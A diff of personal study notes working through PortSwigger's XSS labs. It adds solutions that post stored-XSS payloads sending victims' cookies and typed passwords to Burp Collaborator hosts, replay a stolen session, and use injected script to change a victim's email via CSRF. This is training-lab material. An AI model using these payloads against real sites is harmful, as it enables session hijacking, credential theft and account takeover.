@@ -1,32 +1,119 @@
 # **xss burp labs**
 https://portswigger.net/web-security/cross-site-scripting
 
-
 # **Reflected XSS**
 https://portswigger.net/web-security/cross-site-scripting/reflected
 
-
-
-# **Exploiting cross-site scripting vulnerabilities - 3 labs**
+<span style="color:yellow;font-weight:700;font-size:30px">
+Exploiting cross-site scripting vulnerabilities - 3 labs
+</span>
 https://portswigger.net/web-security/cross-site-scripting/exploiting
 
 # ***1. Lab: Exploiting cross-site scripting to steal cookies***
 https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies
-// require burp colaborator - not solved
+
+This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim. 
+
+1. find stored XSS:
+    POST /post/comment HTTP/1.1
+    Cookie: session=VaFtkIpmQsVgJNSJXR6SzOWjyJjPcOqH
+
+    csrf=tNfZzLkcKOAkjY2i4hkV3JajKwRfmVo8&postId=2&comment=<script>alert(1)</script>&name=<script>alert(2)</script>&email=1@drive.com&website=
+
+**response:** 
+> POP alert 1
+comment is vulnerable
+
+**burp colaborator**
+> hqb7iapxk2hjk1bcmv371ssm7dd81x.oastify.com
+
+craft XSS:
+<!-- >POST /post/comment HTTP/1.1
+>Cookie: session=VaFtkIpmQsVgJNSJXR6SzOWjyJjPcOqH
+>
+>csrf=tNfZzLkcKOAkjY2i4hkV3JajKwRfmVo8&postId=3&comment=<script>fetch('http://c2f2u51swxtewwn7yqf2dn4hj8p5du.oastify.com/'+document.cookie)</script>&name=attacker&email=1@drive.com&website=
+
+works on me but i dont get a anything from vic. lets try different mehtod to initiate the callback: -->
+
+>POST /post/comment HTTP/1.1
+>Cookie: session=VaFtkIpmQsVgJNSJXR6SzOWjyJjPcOqH
+>
+>csrf=tNfZzLkcKOAkjY2i4hkV3JajKwRfmVo8&postId=4&comment=<script>document.location='http://c2f2u51swxtewwn7yqf2dn4hj8p5du.oastify.com/'+document.cookie;</script>&name=attacker&email=1@drive.com&website=
+
+**resonse in burp colaborator:**
+> GET /secret=vDuHiLHzGprgjsyF4NcJGT6adF2zrqfX;%20session=E2kwm5V1vFUkQq2vW89G2WimZ6N4UiGa HTTP/1.1
+
+send a **GET / HTTP/1.1** to repeater and change the cookie value (session) with the extracted values (secret. session):
+
+> GET / HTTP/1.1
+> Cookie: secret=vDuHiLHzGprgjsyF4NcJGT6adF2zrqfX; session=E2kwm5V1vFUkQq2vW89G2WimZ6N4UiGa
+
+# Lab solved
 
 
 # ***2. Lab: Exploiting cross-site scripting to capture passwords***
 https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords
-// require burp colaborator - not solved
+ 
+ This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account. 
+
+check where for XSS:
+>POST /post/comment HTTP/1.1
+
+>csrf=2hUq6dqUHYhlhDjySjZDKNgC7pxsM6bL&postId=6&comment=<script>alert('comment')</script>&name=<name>&email=clean@token.com&website=
+
+craft a payload:
+1. use website form to post a comment:
+'''htm
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://2wzsovviqnn4qmhxsg9s7dy7dyj17q.oastify.com',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+'''
+
+response:
+> POST / HTTP/1.1
+>
+> administrator:oa183my69g2j1n51m7xs
+
+# Lab Solved
 
 
 # ***3. Lab: Exploiting XSS to perform CSRF***
 https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf
-// not solved
+
+ This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.
+
+You can log in to your own account using the following credentials: wiener:peter 
+
+1. login to wiener account and do a email change process:
+> POST /my-account/change-email HTTP/1.1
+>
+> email=wiener@normal-user.net&csrf=NuLVz3gIonlrTUSodUwybd6nDdponj5a
 
 
+2. use website form to post a comment:
+'''htm
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=attacker@gnail.com')
+};
+</script>
 
-# **Cross-site scripting contexts - 15 labs**
+# Lab solved
+
+
+<span style="color:yellow;font-weight:700;font-size:30px">
+Cross-site scripting contexts - 15 labs
+</span>
 https://portswigger.net/web-security/cross-site-scripting/contexts
 
 
@@ -441,14 +528,10 @@ ref:
 https://0a1c00a404fd51e9c1e76ff900ec007f.web-security-academy.net/'/'--!%3E;alert(document.domain)//
 
 
-
 post solutions:
 http://foo?&apos;-alert(1)-&apos;
 
-?? do you send it as is or do you url encode the & ?
-
-
-
+<!-- ?? do you send it as is or do you url encode the & ? -->
 
 # ***15. Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped***
 https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped
@@ -466,36 +549,7 @@ reflection in response:
     </script>
 
 payload:
-${alert(document.domain)} 
-
-
-
-$) // just to close previous topic
-
-
-
-# **Exploiting cross-site scripting vulnerabilities**
-https://portswigger.net/web-security/cross-site-scripting/exploiting
-
-# 1***. Lab: Exploiting cross-site scripting to steal cookies***
-https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies
-
-require pro
-# TBC
-
-
-# 2. ***Lab: Exploiting cross-site scripting to capture passwords***
-https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords
-
-require pro
-# TBC
-
-
-# ***3. Lab: Exploiting XSS to perform CSRF***
-https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf
-
-require pro
-# TBC
+> ${alert(document.domain)} 
 
 
 
